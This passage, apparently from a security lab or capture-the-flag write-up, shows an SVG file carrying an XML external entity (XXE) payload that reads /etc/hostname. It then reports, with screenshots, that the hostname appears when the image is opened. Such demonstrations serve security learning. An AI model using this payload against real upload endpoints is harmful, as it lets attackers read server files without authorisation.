```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Now open the SVG image in new tab, and inside it. Is our hostname output. Awesome
![unnamed_21d5c99806b24186bce8e51d6a7e9cd3](unnamed_21d5c99806b24186bce8e51d6a7e9cd3.png)
![unnamed_86bbb93072f94ef98a01f44a8bba6d57](unnamed_86bbb93072f94ef98a01f44a8bba6d57.png)
